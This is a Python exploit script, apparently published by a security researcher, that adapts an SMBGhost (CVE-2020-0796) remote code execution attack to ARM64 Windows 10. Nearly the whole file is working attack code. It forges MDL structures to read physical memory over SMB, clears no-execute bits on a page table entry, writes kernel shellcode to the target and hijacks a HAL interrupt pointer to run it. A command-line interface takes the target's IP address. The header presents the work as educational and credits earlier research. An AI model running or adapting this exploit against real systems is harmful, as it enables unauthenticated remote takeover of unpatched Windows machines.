#
#   SMBaloo
#
#   @hugeh0ge first wrote about exploiting SMBGhost (CVE-2020-0796) and using MDL to read physical memory pages: 
#       https://ricercasecurity.blogspot.com/2020/04/ill-ask-your-body-smbghost-pre-auth-rce.html
#   It's a great blogpost to understand the vulnerability, although no one said that MDL_SOURCE_IS_NONPAGED_POOL flag should NOT be present.
#   Thanks to the MmGetSystemAddressForMdlSafe() macro for the hint. Go follow him on Twitter: https://twitter.com/hugeh0ge
#
#   This is an ARM64 adapted version of the excellent work and exploit written by @chompie1337: https://github.com/chompie1337/SMBGhost_RCE_PoC
#   Go follow her on Twitter: https://twitter.com/chompie1337
#
#   Kudos to both of them for the awesome stuff. I was looking for a good bug that I could leverage to learn ARM64 and how to write an RCE exploit
#   at the same time, I couldn't have done without their prior work.
#
#   Some additional good reading on the vulnerability has been published by the zecOps team, kudos to them and Michael Maltsev (@m417z)
#       https://blog.zecops.com/vulnerabilities/smbleedingghost-writeup-chaining-smbleed-cve-2020-1206-with-smbghost/
#
#   Do not use for anything else otherwise than educational purposes, this was only tested on the only ARM64 machine (Win10 10.0.18362.657) I have and was happy enough that
#   it was running consistently on it. Make sure KB4551762 is not installed.
#
#   Acknowlegments:
#       Special thanks to @s7ephen for being the ultimate ARM64 enabler. 
#       Barnaby (RIP), I also gave a refresh to your APC injection technique. I hope you like it.
#       Thanks to Satoshi Tanda (@standa_t) and Petr BeneÅ¡ (@PetrBenes) for helping me troubleshooting my original debugging set-up :)
#       And a big thanks to Sean Dillon (@zerosum0x0) for his prior work on SMB exploitation and our brainstorming sessions :)
#       Laurent Gaffie (@PythonResponder) for his prior work on SMB.
#       The NSA for developping (or buying) (and leaking? Cheers to TheShadowBrokers) ETERNALBLUE and DOUBLEPULSAR, 
#           the exploit is soon gonna be 10 years old that it almost feels like nothing new got released since then.
#       Microsoft Platform Security Assurance & Vulnerability Research for finding CVE-2020-0796.
#       Nicolas Economou (@NicoEconomou) and Alex Ionescu (@aionescu) for their publications on HAL stuff.
#       Nikita Karetnikov (@karetnikovn) for the ARM interest.
#
#       And the OPCDE community! Join us on Discord: https://discord.gg/Wp8Nzxh or go on www.opcde.com if the link is dead :)
#
#   Author:
#       Matt Suiche (@msuiche) 20-June-2020 - Initial Implementation
#

#!/usr/bin/env python

import sys
import socket
import struct
import argparse

from lznt1 import compress, compress_evil
from smb_win import smb_negotiate, smb_compress

from shellcode import *

# hal.dll
#     Timestamp: 4328224B
#   SizeOfImage: 36F000
#           pdb: hal.pdb
#       pdb sig: 24BF0D45-4FA0-30FF-4791-CA91A5EAD872
#           age: 1
# 0: kd> ? hal!HalpRegisteredInterruptControllers - hal
# Evaluate expression: 3433328 = 00000000`00346370
HalpRegisteredInterruptControllers_Relative_VA = 0x346370

# Not randomized!? The 80009 PFN on my Lenovo Yoga C630 has been consistent across a lot of reboots.
# 0: kd> !pte poi(hal!HalpInterruptController)
#                                           VA fffff7e900007000
# PXE at FFFFABD5EAF57F78    PPE at FFFFABD5EAFEFD20    PDE at FFFFABD5FDFA4000    PTE at FFFFABFBF4800038
# contains 0060000084600F03  contains 00E0000084603F03  contains 00E0000084604F03  contains 00E0000080009F03
# pfn 84600      -R--ADK--V  pfn 84603      -W--ADK--V  pfn 84604      -W--ADK--V  pfn 80009      -W--ADK--V
#
# This will probably change from one machine to another, but the best way to predict those values would be to reverse
# more closely bootmgfw!MmArm64pAllocateAndInitializePageTables. I haven't done it yet.
# Another point, is that even if we can get this Pfn - we can't read it. At least I was not able to read it due to timeout or 
# unlockable pages.
#
# kd> p
# bootmgfw!MmArm64pAllocateAndInitializePageTables+0xd4:
# 00000000`bb8cb35c 54fffdc3 blo         bootmgfw!MmArm64pAllocateAndInitializePageTables+0x8c (00000000`bb8cb314)
# kd> p
# bootmgfw!MmArm64pAllocateAndInitializePageTables+0xd8:
# 00000000`bb8cb360 52800015 mov         w21,#0
# kd> r x0
# x0=00000000800a9000
HalpInterruptController_PhysAddr = 0x000000080009000
# The above value may be 0x000000040009000 on other systems, depending how the physical memory ranges start.
# But it will very likely be: (StartRange + 0x9 * PAGE_SIZE)

# Pcr[0].Pcrb.ProcessorState.ArchState.Ttbr0_El1
#    [+0x020] Tcr_El1          : 0x95b5513511 [Type: unsigned __int64]
#    [+0x028] Ttbr0_El1        : 0x400000800a9000 [Type: unsigned __int64]
#    [+0x030] Ttbr1_El1        : 0x400000800a9800 [Type: unsigned __int64]
MmArm64PageTable_Ttbr0_El1 = 0x0000000800a9000
# dq poi(hal!HalpInterruptController)+0x18 L1
HalpInterruptController_Sig = 0x00000545

KUSER_SHARED_DATA = 0xFFFFF78000000000

#
# If only we could read MmArm64PageTable_Ttbr0_El1 without any problems...
# Those values are retrieve while debugging since we can't resolve TTBR0_EL1_SelfRef to find the 
# KUSER_SHARED_DATA_Pte_VirtAddr address and KUSER_SHARED_DATA_Pte value.
#
# !pte 0xFFFFF78000000000
KUSER_SHARED_DATA_Pte_PhysAddr = 0x84602000
KUSER_SHARED_DATA_Pte = 0x00E0000084646F03 # 0x00E0000084647F03 # 0x00E0000084647F03
# This gets randomized.
KUSER_SHARED_DATA_Pte_VirtAddr = 0xFFFFB97BC0000000 # 0xFFFFF17BC0000000 # 0xFFFFDC7BC0000000 # 0xFFFFEFFBC0000000

# This is randomized.
TTBR0_EL1_SelfRef = 0
HalpInterruptController_VirtAddr = 0
pHalpGic3RequestInterrupt = 0
HalpGic3RequestInterrupt = 0
HalBase_VirtAddr = 0

# Offset of hal!HalpGic3RequestInterrupt pointer in hal!HalpInterruptController
HALP_GIC3_REQ_INTERRUPT_OFFSET = 0x78
# Offset of pNetRawBuffer in SRVNET_BUFFER_HDR
PNET_RAW_BUFF_OFFSET = 0x18
# Offset of pMDL1 in SRVNET_BUFFER_HDR
PMDL1_OFFSET = 0x38

max_read_retry = 3
overflow_val = 0x1100
write_unit = 0xd0
pmdl_va = KUSER_SHARED_DATA + 0x900
# For some reasons, SrvNetWskSendDataInternal() subs 4 to MDL->MappedSystemVa, so we need to add the delta.
pmdl_mapva = KUSER_SHARED_DATA + 0x800 # KUSER_SHARED_DATA + 4 # 


def print_mdl_flags(mdl_flags):
    print(" mdl_flags: 0x%x" % mdl_flags)
    if mdl_flags & 0x1:
        print(" - MDL_MAPPED_TO_SYSTEM_VA")
    if mdl_flags & 0x2:
        print(" - MDL_PAGES_LOCKED")
    if mdl_flags & 0x4:
        print(" - MDL_SOURCE_IS_NONPAGED_POOL")
    if mdl_flags & 0x8:
        print(" - MDL_ALLOCATED_FIXED_SIZE")
    if mdl_flags & 0x0010:
        print(" - MDL_PARTIAL")
    if mdl_flags & 0x0020:
        print(" - MDL_PARTIAL_HAS_BEEN_MAPPED")
    if mdl_flags & 0x0040:
        print(" - MDL_IO_PAGE_READ")
    if mdl_flags & 0x0080:
        print(" - MDL_WRITE_OPERATION")
    if mdl_flags & 0x100:
        print(" - MDL_PARENT_MAPPED_SYSTEM_VA")
    if mdl_flags & 0x200:
        print(" - MDL_LOCK_HELD")
    if mdl_flags & 0x0400:
        print(" - MDL_PHYSICAL_VIEW")
    if mdl_flags & 0x0800:
        print(" - MDL_IO_SPACE")
    if mdl_flags & 0x1000:
        print(" - MDL_NETWORK_HEADER")
    if mdl_flags & 0x2000:
        print(" - MDL_MAPPING_CAN_FAIL")
    if mdl_flags & 0x4000:
        print(" - MDL_ALLOCATED_MUST_SUCCEED")

# MDL used for reading physical addresses.
class MDL:
    def __init__(self, map_va, phys_addr=None):
        self.next = struct.pack("<Q", 0x0)
        self.size = struct.pack("<H", 0x48)
        # Check the MmGetSystemAddressForMdlSafe() macro
        # http://www.osronline.com/article.cfm%5Eid=423.htm
        mdl_flags=0x5018
        #  mdl_flags: 0x5018
        # - MDL_ALLOCATED_FIXED_SIZE
        # - MDL_PARTIAL
        # - MDL_NETWORK_HEADER
        # - MDL_ALLOCATED_MUST_SUCCEED
        self.mdl_flags = struct.pack("<H", mdl_flags) # 0x501C) 
        self.alloc_processor = struct.pack("<H", 0x0)
        self.reserved = struct.pack("<H", 0x0)
        self.process = struct.pack("<Q", 0x0)
        if phys_addr:
            self.map_va = struct.pack("<Q", map_va)
        else:
            self.map_va = struct.pack("<Q", map_va + 4)
        map_va &= ~0xFFF
        self.start_va = struct.pack("<Q", map_va)
        self.byte_count = struct.pack("<L", 0x258)
        self.byte_offset = struct.pack("<L", (phys_addr & 0xFFF) + 0x4)
        phys_addr_enc = (phys_addr & 0xFFFFFFFFFFFFF000) >> 12
        self.phys_addr1 = struct.pack("<Q", phys_addr_enc)
        self.phys_addr2 = struct.pack("<Q", phys_addr_enc)
        self.phys_addr3 = struct.pack("<Q", phys_addr_enc)

    def raw_bytes(self):
        mdl_bytes = self.next + self.size + self.mdl_flags + \
                    self.alloc_processor + self.reserved + self.process + \
                    self.map_va + self.start_va + self.byte_count + \
                    self.byte_offset + self.phys_addr1 + self.phys_addr2 + \
                    self.phys_addr3
        return mdl_bytes


def reconnect(ip, port):
    sock = socket.socket(socket.AF_INET)
    sock.settimeout(7)
    sock.connect((ip, port))
    return sock

def write_primitive(ip, port, data, addr):
    sock = reconnect(ip, port)
    smb_negotiate(sock)
    sock.recv(1000)
    uncompressed_data = b"\x41"*(overflow_val - len(data))
    uncompressed_data += b"\x00"*PNET_RAW_BUFF_OFFSET
    uncompressed_data += struct.pack('<Q', addr)
    compressed_data = compress(uncompressed_data)
    smb_compress(sock, compressed_data, 0xFFFFFFFF, data)
    sock.close()

def try_recv(sock):
    try:
        buff = sock.recv(1000)
        return buff
    except socket.timeout:
        return


def write_srvnet_buffer_hdr(ip, port, data, offset):
    sock = reconnect(ip, port)
    smb_negotiate(sock)
    try_recv(sock)
    compressed_data = compress_evil(data)
    dummy_data = b"\x33"*(overflow_val + offset)
    smb_compress(sock, compressed_data, 0xFFFFEFFF, dummy_data)
    sock.close()

def read_physmem_primitive(ip, port, phys_addr):
    i = 0
    while i < max_read_retry:
        i += 1
        buff = try_read_physmem_primitive(ip, port, phys_addr)
        if buff is not None:
            # print(buff)
            return buff

def try_read_physmem_primitive(ip, port, phys_addr):
    fake_mdl = MDL(pmdl_mapva, phys_addr).raw_bytes()
    # print("write_primitive(ip=%s, port=%d, fake_mdl=/, pmdl_va=0x%x)" % (ip, port, pmdl_va))
    write_primitive(ip, port, fake_mdl, pmdl_va)
    # print("write_srvnet_buffer_hdr(ip=%s, port=%d, pmdl_va=0x%x, PMDL1_OFFSET%x)" % (ip, port, pmdl_va, PMDL1_OFFSET))
    write_srvnet_buffer_hdr(ip, port, struct.pack('<Q', pmdl_va), PMDL1_OFFSET)

    i = 0
    while i < max_read_retry:
        i += 1
        sock = reconnect(ip, port)
        smb_negotiate(sock)
        buff = try_recv(sock)
        sock.close()
        if buff:
            if buff[4:8] != b"\xfeSMB":
                return buff

def get_phys_addr(ip, port, va_addr):
    pml4_index = (((1 << 9) - 1) & (va_addr >> (40 - 1)))
    pdpt_index = (((1 << 9) - 1) & (va_addr >> (31 - 1)))
    pdt_index = (((1 << 9) - 1) & (va_addr >> (22 - 1)))
    pt_index = (((1 << 9) - 1) & (va_addr >> (13 - 1)))

    pml4e = MmArm64PageTable_Ttbr0_El1 + pml4_index*0x8
    pdpt_buff = read_physmem_primitive(ip, port, pml4e)

    if pdpt_buff is None:
        sys.exit("[-] physical read primitive failed")

    pdpt = struct.unpack("<Q", pdpt_buff[0:8])[0] & 0xFFFFF000
    pdpte = pdpt + pdpt_index*0x8
    pdt_buff = read_physmem_primitive(ip, port, pdpte)

    if pdt_buff is None:
        sys.exit("[-] physical read primitive failed")

    pdt = struct.unpack("<Q", pdt_buff[0:8])[0] & 0xFFFFF000
    pdte = pdt + pdt_index*0x8
    pt_buff = read_physmem_primitive(ip, port, pdte)

    if pt_buff is None:
        sys.exit("[-] physical read primitive failed")

    pt = struct.unpack("<Q", pt_buff[0:8])[0]
    
    if pt & (1 << (8 - 1)):
        phys_addr = (pt & 0xFFFFF000) + (pt_index & 0xFFF)*0x1000 + (va_addr & 0xFFF)
        return phys_addr
    else:
        pt = pt & 0xFFFFF000

    pte = pt + pt_index*0x8
    pte_buff = read_physmem_primitive(ip, port, pte)

    if pte_buff is None:
        sys.exit("[-] physical read primitive failed")

    phys_addr = (struct.unpack("<Q", pte_buff[0:8])[0] & 0xFFFFF000) + \
                (va_addr & 0xFFF)

    return phys_addr

def get_ttbr_selfref(vaddr):
    return (vaddr >> 39) & 0x1ff

def get_pte_va(pml4_selfref, addr):
    pt = addr >> 9
    lb = (0xFFFF << 48) | (pml4_selfref << 39)
    # print(hex(lb))
    ub = ((0xFFFF << 48) | (pml4_selfref << 39) + 0x8000000000 - 1) & 0xFFFFFFFFFFFFFFF8
    # print(hex(ub))
    pt = pt | lb
    # print(hex(pt))
    pt = pt & ub
    # print(hex(pt))

    return pt


def overwrite_pte(ip, port, addr):
    # Since we can't read MmArm64PageTable_Ttbr0_El1 physical address, we don't have the selfref pte
    # which means we can't find the PTE VA, and we can't read its value either. It seems that page tables are inaccessible.

    # This does not work because we can't read physical address of page tables?
    # phys_addr = get_phys_addr(ip, port, addr)
    # buff = read_physmem_primitive(ip, port, KUSER_SHARED_DATA_Pte_PhysAddr)
    # print(buff)

    # if buff is None:
    #     sys.exit("[-] read primitive failed!")
    # pte_val = struct.unpack("<Q", buff[0:8])[0]

    pte_val = KUSER_SHARED_DATA_Pte
    print("PTE before:")
    print(hex(pte_val))

    # Clear NX bit
    # This is different on ARM64
    # MMPTE_HARDWARE.PrivilegedNoExecute = False
    # MMPTE_HARDWARE.UserNoExecute = False
    overwrite_val = pte_val & ~(3 << 53)
    print("PTE after:")
    print(hex(overwrite_val))
    overwrite_buff = struct.pack("<Q", overwrite_val)

    write_primitive(ip, port, overwrite_buff, addr)

def build_arm64_shellcode():
    shellcode = KERNEL_SHELLCODE
    shellcode += struct.pack("<Q", pHalpGic3RequestInterrupt)
    shellcode += struct.pack("<Q", HalpGic3RequestInterrupt)
    shellcode += KERNEL_DATA_STRUCT
    shellcode += USER_PAYLOAD
    return shellcode

def search_selfref(ip, port):
    search_len = 0x1000
    index = MmArm64PageTable_Ttbr0_El1

    while search_len:
        buff = read_physmem_primitive(ip, port, index)
        if buff is None:
            return
        entry_indices = 8*(((len(buff) + 8 // 2) // 8) - 1)
        i = 0
        while i < entry_indices:
            entry = struct.unpack("<Q",buff[i:i+8])[0] & 0xFFFFF000
            if entry == MmArm64PageTable_Ttbr0_El1:
                return index + i
            i += 8
        search_len -= entry_indices
        index += entry_indices

# This works the same with TTBR
def find_ttbr_selfref(ip, port):
    self_ref = search_selfref(ip, port)

    if self_ref is None:
        sys.exit("[-] failed to find TTBR self reference entry!")
    print(hex(self_ref))

    self_ref = (self_ref & 0xFFF) >> 3

    print("[+] found TTBR self-ref entry %0x" % self_ref)
    return self_ref


def ReadHalInterruptController(ip, port):
    global pHalpGic3RequestInterrupt, HalpInterruptController_VirtAddr, HalpGic3RequestInterrupt, HalBase_VirtAddr
    buff = read_physmem_primitive(ip, port, HalpInterruptController_PhysAddr)
    if buff is not None:
        # print(buff)
        entry = struct.unpack("<Q", buff[0x18:0x18+8])[0] & 0xFFFFFFFFFFFFFFFF
        if entry == HalpInterruptController_Sig:
            print("[+] hal!HalpInterruptController found at %lx!" % HalpInterruptController_PhysAddr)

            HalpInterruptController_VirtAddr = struct.unpack("<Q", buff[0x10: 0x10 + 8])[0] & 0xFFFFFFFFFFFFF000
            print("[+] HalpInterruptController_VirtAddr at %lx" % HalpInterruptController_VirtAddr)

            HalpGic3RequestInterrupt = struct.unpack("<Q", buff[HALP_GIC3_REQ_INTERRUPT_OFFSET: HALP_GIC3_REQ_INTERRUPT_OFFSET + 8])[0]
            print("[+] HalpGic3RequestInterrupt at %lx" % HalpGic3RequestInterrupt)

            pHalpGic3RequestInterrupt = HalpInterruptController_VirtAddr + HALP_GIC3_REQ_INTERRUPT_OFFSET
            print("[+] pHalpGic3RequestInterrupt at %lx" % pHalpGic3RequestInterrupt)

            HalpRegisteredInterruptControllers = struct.unpack("<Q", buff[0:8])[0] & 0xFFFFFFFFFFFFFFFF
            if (HalpRegisteredInterruptControllers & 0xFFF) != (HalpRegisteredInterruptControllers_Relative_VA & 0xFFF):
                sys.exit('[-] HalpRegisteredInterruptControllers_Relative_VA is not valid for this version of Windows.')
            else:
                HalBase_VirtAddr = HalpRegisteredInterruptControllers - HalpRegisteredInterruptControllers_Relative_VA
                print("[+] HalBase_VirtAddr at %lx" % HalBase_VirtAddr)
            return True

    sys.exit("[-] Failed to find HalpInterruptController!")
    return False


def ScanPhysMem(ip, port):
    # A sample function to read physical memory ranges remotely, it hangs for certain pages.
    # This reminds me when people were trying to do raw memory dumps without even considering reading
    # PHYSICAL_MEMORY_DESCRIPTOR / PHYSICAL_MEMORY_RUN..
    # MmGetPhysicalMemoryRanges() is a useful API for that.
    # Here is a cached article I wrote in 2008 about it: http://blog.csdn.net/iiprogram/article/details/3080059 
    basePa = 0x80000000
    maxPages = 0x10
    i = 0x0

    while i < maxPages:
        PhysAddr = basePa + (i * 0x1000)
        buff = read_physmem_primitive(ip, port, PhysAddr)
        if buff is not None:
            print("[%lx] = YES" % (PhysAddr))
        else:
            print("[%lx] = NO" % (PhysAddr))
        i = i + 1


def do_rce(ip, port):

    # print_mdl_flags(0x004)
    # print_mdl_flags(0x033)
    # print_mdl_flags(0x0048)
    # print_mdl_flags(0x1004)
    # print_mdl_flags(0x5018)
    # print_mdl_flags(0x501C)

    ReadHalInterruptController(ip, port)
    arm64shellcode = build_arm64_shellcode()
    print("[+] built shellcode!")

    # Default value.
    pshellcodeva = KUSER_SHARED_DATA + 0x950

    if HalBase_VirtAddr:
        # That's the default method now, although I was using the SelfRef/KUSER_SHARED_DATA one for development.
        # New method which works well for my lab.
        pshellcodeva = HalBase_VirtAddr + 0x500
    else: 
        # Can't read MmArm64PageTable_Ttbr0_El1 for some reasons.
        # TTBR0_EL1_SelfRef = find_ttbr_selfref(ip, port) 
        # We provide the selfref manually for now.
        TTBR0_EL1_SelfRef = get_ttbr_selfref(KUSER_SHARED_DATA_Pte_VirtAddr)
        pKernelUserSharedPTE = get_pte_va(TTBR0_EL1_SelfRef, KUSER_SHARED_DATA)
        print("[+] KUSER_SHARED_DATA PTE at %lx" % pKernelUserSharedPTE)

        overwrite_pte(ip, port, KUSER_SHARED_DATA_Pte_VirtAddr)
        print("[+] KUSER_SHARED_DATA PTE PrivilegedNoExecute and UserNoExecute bits cleared!")

    to_write = len(arm64shellcode)
    write_bytes = 0
    while write_bytes < to_write:
        write_sz = min([write_unit, to_write - write_bytes])
        write_primitive(ip, port, arm64shellcode[write_bytes:write_bytes + write_sz], pshellcodeva + write_bytes)
        write_bytes += write_sz
    
    print("[+] Wrote shellcode at %lx!" % pshellcodeva)

    input("[+] Press a key to execute shellcode!")
    write_primitive(ip, port, struct.pack("<Q", pshellcodeva), pHalpGic3RequestInterrupt)
    print("[+] [%lx] = %lx" % (pHalpGic3RequestInterrupt, pshellcodeva))
    print("[+] overwrote HalpInterruptController pointer, should have execution shortly...")

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("-ip", help="IP address of target", required=True)
    parser.add_argument("-p", "--port", default=445, help="SMB port, \
                        default: 445", required=False, type=int)
    args = parser.parse_args()

    do_rce(args.ip, args.port)
